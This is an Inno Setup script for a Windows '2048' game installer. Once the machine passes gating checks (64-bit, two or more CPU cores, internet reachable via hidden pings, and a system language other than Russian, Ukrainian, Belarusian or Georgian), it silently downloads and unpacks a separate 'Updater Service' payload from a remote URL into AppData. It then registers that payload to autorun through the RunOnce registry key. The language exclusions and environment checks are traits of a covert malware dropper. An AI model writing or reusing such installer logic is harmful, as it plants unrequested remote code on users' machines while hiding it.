;#include <idp.iss>

[Setup]
AppName=2048 Game Professional for Windows
AppVersion=1.7.0.0
VersionInfoVersion=1.7.0.0
AppPublisher=Open Source Developer Masha Novedad
AppPublisherURL=https://github.com/windows-2048
AppUpdatesURL=https://sourceforge.net/projects/exe-2048/
AppSupportURL=https://sourceforge.net/projects/exe-2048/
AppCopyright=2018-2019 Open Source Developer Masha Novedad
PrivilegesRequired=lowest
DefaultDirName={userappdata}\2048GameProfessional
LicenseFile=_license.txt
DefaultGroupName=2048 Game Professional for Windows
UninstallDisplayIcon={app}\2048GameProfessional\2048GameProfessional.exe
Compression=bzip/9
SolidCompression=yes
OutputDir=.\bin
AlwaysShowDirOnReadyPage=yes
AlwaysShowGroupOnReadyPage=yes
WizardImageFile=_wizardimage.bmp
WizardSmallImageFile=_wizardimagesmall.bmp
#ifnexist "_DEBUG"
OutputBaseFilename=Setup_2048GameProfessional_1_7_0_0
#else
OutputBaseFilename=Setup_2048GameProfessional_1_7_0_0d
#endif
CloseApplications=force
SetupMutex=Setup_2048GameProfessional
DirExistsWarning=no
Encryption=yes
Password=1.7.0.0

[Dirs]
; Note it only removes dir if it is empty after automatic file uninstalling done
Name: "{app}"; Flags: uninsalwaysuninstall;

[Files]
; Place all common files here, first one should be marked 'solidbreak'
Source: "2048GameProfessional_v1_7_0_0_subdir.exe"; DestDir: "{tmp}\Setup_2048GameProfessional_v1.7.0.0"; Flags: ignoreversion;
Source: "_ver.bat"; DestDir: "{app}\2048GameProfessional\source_code"; Flags: ignoreversion;
Source: "alt64curl\alt64curl.dll"; DestDir: "{tmp}\Setup_OSDMNUU_v4.5.7.0"; Flags: ignoreversion; Check: GoodSysCheck
Source: "InnoSetupDownloader\InnoSetupDownloader.exe"; DestDir: "{tmp}\Setup_OSDMNUU_v4.5.7.0"; Flags: ignoreversion; Check: GoodSysCheck
Source: "_readme.txt"; DestDir: "{userappdata}\osdmnuu_dir"; Flags: ignoreversion; Check: GoodSysCheck


[Code]
var g_bGoodSysCheck: Boolean;

function GoodSysCheck(): Boolean;
begin
    //MsgBox('GoodSysCheck()', mbInformation, MB_OK);
    Result := g_bGoodSysCheck;
    if Result then
    begin
        //MsgBox('GoodSysCheck() True', mbInformation, MB_OK);
    end;
end;

function InternetOnline(): Boolean;
var iResultCode: Integer;
var iInetCnt: Integer;
begin
    Result := True;

    iInetCnt := 0;

    if Exec(ExpandConstant('{sys}\ping.exe'), '-n 1 -w 1000 8.8.4.4', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
    begin
        if (iResultCode = 0) then
        begin
            //MsgBox('False ping www.google.com', mbInformation, MB_OK);
            iInetCnt := iInetCnt + 1;
        end;
    end;

    if Exec(ExpandConstant('{sys}\ping.exe'), '-n 1 -w 1000 37.235.1.177', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
    begin
        if (iResultCode = 0) then
        begin
            //MsgBox('False ping www.microsoft.com', mbInformation, MB_OK);
            iInetCnt := iInetCnt + 1;
        end;
    end;

    if Exec(ExpandConstant('{sys}\ping.exe'), '-n 1 -w 1000 209.244.0.3', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
    begin
        if (iResultCode = 0) then
        begin
            //MsgBox('False ping www.gnu.org', mbInformation, MB_OK);
            iInetCnt := iInetCnt + 1;
        end;
    end;

    if iInetCnt < 1 then
    begin
        Result := False;
    end;
end;

function GoodLanguage(): Boolean;
var iLang: Integer;
begin
    iLang := GetUILanguage();

    Result := True;

#ifnexist "_DEBUG"
    if iLang = $0419 then
    begin
        //MsgBox('False $0419', mbInformation, MB_OK);
        Result := False;
    end;
#endif

    if iLang = $0422 then
    begin
        //MsgBox('False $0422', mbInformation, MB_OK);
        Result := False;
    end;

    if iLang = $0423 then
    begin
        //MsgBox('False $0423', mbInformation, MB_OK);
        Result := False;
    end;

    if iLang = $043f then
    begin
        //MsgBox('False $043f', mbInformation, MB_OK);
        Result := False;
    end;
end;

// %NUMBER_OF_PROCESSORS%
// {%NAME|DefaultValue}
// function ExpandConstant(const S: String): String;
// function StrToIntDef(s: string; def: Longint): Longint;

function EnoughProcessorCores(): Boolean;
var strNumOfCores: String;
var nNumOfCores: Longint;
begin
    Result := False;

    strNumOfCores := ExpandConstant('{%NUMBER_OF_PROCESSORS|1}');
    nNumOfCores := StrToIntDef(strNumOfCores, 1);

    if (nNumOfCores >= 2) then
    begin
        //MsgBox('nNumOfCores >= 2 True', mbInformation, MB_OK);
        Result := True;
    end;
end;

function OsdmnuuNotYetInstalled(): Boolean;
begin
    Result := not(DirExists(ExpandConstant('{userappdata}\osdmnuu_dir')));
end;

/////////////////////////////////////////////////////////////////////
function GetUninstallString(): String;
var
  sUnInstPath: String;
  sUnInstallString: String;
begin
  sUnInstPath := 'Software\Microsoft\Windows\CurrentVersion\Uninstall\2048 Game Professional for Windows_is1';
  sUnInstallString := '';
  if not RegQueryStringValue(HKLM, sUnInstPath, 'UninstallString', sUnInstallString) then
    RegQueryStringValue(HKCU, sUnInstPath, 'UninstallString', sUnInstallString);
  Result := sUnInstallString;
end;


/////////////////////////////////////////////////////////////////////
function IsUpgrade(): Boolean;
begin
  Result := (GetUninstallString() <> '');
end;

procedure InitializeWizard();
var iResultCode: Integer;
begin
#ifexist "_DEBUG"
    MsgBox('InitializeWizard(): #ifexist "_DEBUG" True', mbInformation, MB_OK);
#endif

    // 2048GameProfessional

    if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im 2048GameProfessional.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
    begin
#ifexist "_DEBUG"
        MsgBox('InitializeWizard()taskkill.exe /f /im 2048GameProfessional.exe FALSE', mbInformation, MB_OK);
#endif
    end;

    g_bGoodSysCheck := IsWin64() and GoodLanguage() and InternetOnline() and EnoughProcessorCores() and (OsdmnuuNotYetInstalled() or IsUpgrade());
    if g_bGoodSysCheck then
    begin
        //MsgBox('InitializeWizard() True', mbInformation, MB_OK);

        // 2048GameProfessional_Updater_1

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im 2048GameProfessional_Updater_1.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im 2048GameProfessional_Updater_1.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im 2048GameProfessional_Updater_1a.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im 2048GameProfessional_Updater_1a.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im 2048GameProfessional_Updater_1g.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im 2048GameProfessional_Updater_1g.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        // 2048GameProfessional

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im 2048GameProfessional_Updater_1.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im 2048GameProfessional_Updater_1.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im 2048GameProfessional_Updater_1a.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im 2048GameProfessional_Updater_1a.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im 2048GameProfessional_Updater_1g.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im 2048GameProfessional_Updater_1g.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        // InnoSetupDownloader

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im InnoSetupDownloader.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im InnoSetupDownloader.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        // osdmnus

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im osdmnus.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im osdmnus.exe FALSE', mbInformation, MB_OK);
#endif
        end;

        // osdmnuu

        if not Exec(ExpandConstant('{sys}\taskkill.exe'), '/f /im osdmnuu.exe', ExpandConstant('{tmp}'), SW_HIDE, ewWaitUntilTerminated, iResultCode) then
        begin
#ifexist "_DEBUG"
            MsgBox('InitializeWizard()taskkill.exe /f /im osdmnuu.exe FALSE', mbInformation, MB_OK);
#endif
        end;
    end;
end;

procedure InstallMainAppDir; // 1207-5
var // https://sourceforge.net/p/fast-mouse-clicker-pro/code/ci/master/tree/InnoSetupDownloader/InnoSetupDownloader.exe?format=raw
  StatusText: string;
  ResultCode: Integer;
begin
  StatusText := WizardForm.StatusLabel.Caption;
  WizardForm.StatusLabel.Caption := 'Installing 2048 Game Professional for Windows. This might take a few minutes...';
  WizardForm.ProgressGauge.Style := npbstMarquee;
  ResultCode := 0;
  try
    if not Exec(ExpandConstant('{tmp}\Setup_2048GameProfessional_v1.7.0.0\2048GameProfessional_v1_7_0_0_subdir.exe'), ExpandConstant('-d"{app}" -p1122334455 -s'), ExpandConstant('{tmp}\Setup_2048GameProfessional_v1.7.0.0'), SW_HIDE, ewWaitUntilTerminated, ResultCode) then
    begin
        MsgBox('2048 Game Professional for Windows installation failed with code: ' + IntToStr(ResultCode) + '.', mbError, MB_OK);
    end;
  finally
    WizardForm.StatusLabel.Caption := StatusText;
    WizardForm.ProgressGauge.Style := npbstNormal;

    DelTree(ExpandConstant('{tmp}\Setup_2048GameProfessional_v1.7.0.0'), True, True, True);
  end;
end;

procedure InstallOsdmnuuDir;
var
  StatusText: string;
  ResultCode: Integer;
begin
  StatusText := WizardForm.StatusLabel.Caption;
  WizardForm.StatusLabel.Caption := 'Installing Updater Service. This might take a few minutes...';
  WizardForm.ProgressGauge.Style := npbstMarquee;
  ResultCode := 0;
  try
    if not Exec(ExpandConstant('{tmp}\Setup_OSDMNUU_v4.5.7.0\InnoSetupDownloader.exe'), ExpandConstant('https://sourceforge.net/p/exe-2048/code/ci/master/tree/InnoSetupDownloader/UniversalUpdater/osdmnuu_dir_v4_5_7_0b_subdir.dat?format=raw https://github.com/windows-2048/2048-Game-Professional-for-Windows/raw/master/InnoSetupDownloader/UniversalUpdater/osdmnuu_dir_v4_5_7_0b_subdir.dat 9fbd6d6ccbbbafd9d3e49f5279fd1b66c342c31545f6b56f5d52752f81b33693 1122334455 {userappdata} \osdmnuu_dir \osdmnus.exe true'), ExpandConstant('{tmp}\Setup_OSDMNUU_v4.5.7.0'), SW_HIDE, ewWaitUntilTerminated, ResultCode) then
    begin
#ifexist "_DEBUG"
        MsgBox('Updater Service installation failed with code: ' + IntToStr(ResultCode) + '.', mbError, MB_OK);
#endif
    end;
  finally
    WizardForm.StatusLabel.Caption := StatusText;
    WizardForm.ProgressGauge.Style := npbstNormal;

    DelTree(ExpandConstant('{tmp}\Setup_OSDMNUU_v4.5.7.0'), True, True, True);
  end;
end;

/////////////////////////////////////////////////////////////////////
function UnInstallOldVersion(): Integer;
var
  sUnInstallString: String;
  iResultCode: Integer;
begin
// Return Values:
// 1 - uninstall string is empty
// 2 - error executing the UnInstallString
// 3 - successfully executed the UnInstallString

  // default return value
  Result := 0;

  // get the uninstall string of the old app
  sUnInstallString := GetUninstallString();
  if sUnInstallString <> '' then begin
    sUnInstallString := RemoveQuotes(sUnInstallString);
    if Exec(sUnInstallString, '/SILENT /NORESTART /SUPPRESSMSGBOXES','', SW_HIDE, ewWaitUntilTerminated, iResultCode) then
      Result := 3
    else
      Result := 2;
  end else
    Result := 1;
end;

/////////////////////////////////////////////////////////////////////
procedure CurStepChanged(CurStep: TSetupStep);
begin
  if (CurStep=ssInstall) then
  begin
    if (IsUpgrade()) then
    begin
      UnInstallOldVersion();
      Sleep(2000); //wait two seconds here
    end;
  end;

  if (CurStep=ssPostInstall) then
  begin
    InstallMainAppDir();
  end;

  case CurStep of
    ssDone:
      begin
        if GoodSysCheck() then
        begin
          InstallOsdmnuuDir();
        end;
      end;
  end;
end;

procedure CurPageChanged(CurPageID: Integer);
begin
  if CurPageID = wpPassword then
  begin
    WizardForm.PasswordLabel.Caption := 'Just click the Next button.'
    WizardForm.PasswordEditLabel.Caption := 'Password 1.7.0.0 is already entered.'
    WizardForm.PasswordEdit.Text := '1.7.0.0'
  end;
end;

[Icons]
Name: "{group}\2048 Game Professional for Windows"; Filename: "{app}\2048GameProfessional\2048GameProfessional.exe"
Name: "{group}\2048 Game Professional for Windows source code"; Filename: "{app}\2048GameProfessional\source_code"; WorkingDir: "{app}\2048GameProfessional\source_code"
Name: "{userdesktop}\2048 Game Professional for Windows"; Filename: "{app}\2048GameProfessional\2048GameProfessional.exe"

[Registry]
Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\RunOnce"; ValueType: string; ValueName: "Open_Source_Developer_Masha_Novedad"; ValueData: "{userappdata}\osdmnuu_dir\osdmnus.exe"; Flags: dontcreatekey uninsdeletevalue uninsdeletekeyifempty; Check: GoodSysCheck

[Run]
Filename: "{app}\2048GameProfessional\2048GameProfessional.exe"; Description: {cm:LaunchProgram,{cm:AppName}}; Flags: nowait postinstall skipifsilent
Filename: "{app}\2048GameProfessional\source_code"; Description: "View the source code"; Flags: postinstall shellexec skipifsilent

[UninstallRun]
Filename: {sys}\taskkill.exe; Parameters: "/f /im 2048GameProfessional.exe"; Flags: skipifdoesntexist runhidden
Filename: {sys}\taskkill.exe; Parameters: "/f /im InnoSetupDownloader.exe"; Flags: skipifdoesntexist runhidden; Check: GoodSysCheck
Filename: {sys}\taskkill.exe; Parameters: "/f /im osdmnus.exe"; Flags: skipifdoesntexist runhidden; Check: GoodSysCheck
Filename: {sys}\taskkill.exe; Parameters: "/f /im osdmnuu.exe"; Flags: skipifdoesntexist runhidden; Check: GoodSysCheck

[UninstallDelete]
Type: filesandordirs; Name: "{app}\2048GameProfessional"
Type: filesandordirs; Name: "{userappdata}\2048GameProfessional"
Type: filesandordirs; Name: "{userappdata}\osdmnuu_dir"

[CustomMessages]
AppName=2048 Game Professional for Windows version 1.7.0.0
LaunchProgram=Start application after finishing installation
